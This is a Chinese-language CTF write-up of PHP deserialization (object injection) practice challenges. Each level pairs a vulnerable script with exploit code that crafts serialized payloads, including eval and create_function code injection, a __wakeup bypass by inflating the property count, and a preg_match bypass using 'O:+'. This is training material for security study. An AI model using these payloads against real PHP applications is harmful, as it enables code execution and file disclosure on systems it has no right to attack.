## PHP反序列化练习

### level 1

```php
<?php
highlight_file(__FILE__);
class a{
  var $act;
  function action(){
    eval($this->act);
  }
}
$a=unserialize($_GET['flag']);
$a->action();
?>
```

exp:

```php
<?php
class a{
    var $act="show_source('flag.php');";
    function action(){
         // eval($this->act);
    }
}
echo serialize(new a());
// $a=unserialize($_GET['flag']);
// $a->action();
?>
```

[127.0.0.1:8082/level1/?flag=O:1:"a":1:{s:3:"act";s:24:"show_source(%27flag.php%27);";}](http://127.0.0.1:8082/level1/?flag=O:1:"a":1:{s:3:"act";s:24:"show_source('flag.php');";})

$flag="flag{level1_is_over_come_0n}";

### level 2

```php
<?php
highlight_file(__FILE__);
include("flag.php");
class mylogin{
    var $user;
    var $pass;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            return 1;
        }
    }
}
$a=unserialize($_GET['param']);
if($a->login())
{
    echo $flag;
}
?> 
```

exp

```php
<?php
// highlight_file(__FILE__);
// include("flag.php");
class mylogin{
    var $user="daydream";
    var $pass="ok";
    function __construct($user,$pass){
        // $this->user=$user;
        // $this->pass=$pass;
    }
    function login(){
        // if ($this->user=="daydream" and $this->pass=="ok"){
        //     return 1;
        // }
    }
}
$a=new mylogin('daydream','ok');

echo serialize($a);
// $a=unserialize($_GET['param']);

?> 
```

` `flag{level2_is_0k_here_you_g0}

### level 3

```php
<?php 
highlight_file(__FILE__);
class func
{
        public $key;
        public function __destruct()
        {        
                unserialize($this->key)();
        } 
}

class GetFlag
{       public $code;
        public $action;
        public function get_flag(){
            $a=$this->action;
            $a('', $this->code);
        }
}

unserialize($_GET['param']);

?>
```



```php
<?php
class func
{
    public $key;
    public function __destruct()//
    {
        unserialize($this->key)();//反序列化变为值输出
    }
}

class GetFlag//无法直接触发，需要借助func里的 _destruct()
{
    public $code;
    public $action;
    public function get_flag(){
        $a=$this->action;
        $a('', $this->code);
    }
}
$a1=new func();
$b=new GetFlag();
$b->code='}include("flag.php");echo $flag;//';
$b->action="create_function";
$a1->key=serialize(array($b,"get_flag"));
echo serialize($a1);
?>
```

flag{NI_T_level4_easy_ge_pi}

### level 4

如果类中存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行

```php
<?php
    class secret{
        var $file='index.php';

        public function __construct($file){//先进性construct
            $this->file=$file;
        }

        function __destruct(){
            include_once($this->file);
            echo $flag;
        }

        function __wakeup(){
            $this->file='index.php';
        }
    }
    $cmd=$_GET['cmd'];
    if (!isset($cmd)){
        echo show_source('index.php',true);
    }
    else{
        if (preg_match('/[oc]:\d+:/i',$cmd)){
            echo "Are you daydreaming?";
        }
        else{
            unserialize($cmd);
        }
    }
    //sercet in flag.php
?>
```



```php
<?php
class secret{
    var $file='index.php';

    public function __construct($file){
        $this->file=$file;
        echo $flag;
    }

    function __destruct(){
        include_once($this->file);
    }

    function __wakeup(){
        $this->file='index.php';
    }
}
$pa=new secret('flag.php');
echo serialize($pa),"\n";//O:6:"secret":1:{s:4:"file";s:8:"flag.php";}
$cmd=urlencode('O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}');
echo $cmd;
?>
```

### level 5

原题：

```php
<?php
highlight_file(__FILE__);
class you
{
    private $body;
    private $pro='';
    function __destruct()
    {
        $project=$this->pro;
        $this->body->$project();
    }
}

class my
{
    public $name;

    function __call($func, $args)
    {
        if ($func == 'yourname' and $this->name == 'myname') {
            include('flag.php');
            echo $flag;
        }
    }
}
$a=$_GET['a'];
unserialize($a);
?>
```



```php
<?php
class you
{
    private $body;
    private $pro;
    function __construct(){
        $this->body=new my();
        $this->pro='yourname';//赋予pro名字 以便给pro
    }
    function __destruct()
    {
        $project=$this->pro;//确定project的名字
        $this->body->$project();//$this->body 为 my的类，此句为了触发_call函数。
    }
}

class my
{
    public $name='myname';

    function __call($func, $args)
    {
        if ($func == 'yourname' and $this->name == 'myname') {
            include('flag.php');
            echo $flag;
        }
    }
}
$p=new you();
echo serialize($p);
?>
```

### xctf web_unserialize()

```php
<?php 
class Demo { 
    private $file = 'fl4g.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$p=new Demo('fl4g.php');
$c=serialize($p);
var_dump($c);
//绕过preg_match:O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
//绕过wakeup:O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
$d=str_replace('O:4','O:+4',$c);
$e=str_replace(':1:',':2:',$d);

echo base64_encode($e);

/*if (isset($_GET['var'])) { 
     $var = base64_decode($_GET['var']); 
     if (preg_match('/[oc]:\d+:/i', $var)) {  //匹配数字，可以添加一个加号，即可绕过放一个加号
                                                //可以直接退出序列处理，从而绕过正则匹配。
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} */
?>
```

### 2023-ouc新生赛

题目：

```php
<?php

class A {
    public $a;
    public $b;
    public function __wakeUp() {
        $this->b = "waking up";
    }
    public function __destruct() {
        $this->a = unserialize($_POST['b']);
        echo $this->b;
    }
};

class B {
    public $a;
    public function __toString() {
        if($this->a == "gimmeflag") {
            return file_get_contents("/flag_serialize");
        }
        return "won't";
    }
};

highlight_file(__FILE__);
unserialize($_GET['a']); 
```

题解：

```php
<?php

class A {
    public $a;
    public $b;

    public function __wakeUp() {
         $this->b = "waking up";
     }
    public function __destruct() {//创建一个类后触发并对传入的b进行反序列化，打印b
        $this->a = unserialize($_POST['b']);//触发wakeup函数
        echo $this->b;//把对象当字符串调用，即b为对象，为class B
    }
};

class B {
    public $a;
    public function __toString() {//通过_destruct()来触发，另a=gimmeflag
        if($this->a == "gimmeflag") {
            // return file_get_contents("/flag_serialize");
        }
        return "won't";
    }
};
$p1=new A();
$p1->a=&$p1->b;//p1->a的地址指向了p1->b的地址，从而修改p1->a也修改了p1->b的值
echo serialize($p1);


$p2=new B();
$p2->a="gimmeflag";
echo serialize($p2);
//O:1:"A":2:{s:1:"a";N;s:1:"b";R:2;}
//O:1:"B":1:{s:1:"a";s:9:"gimmeflag";}
```

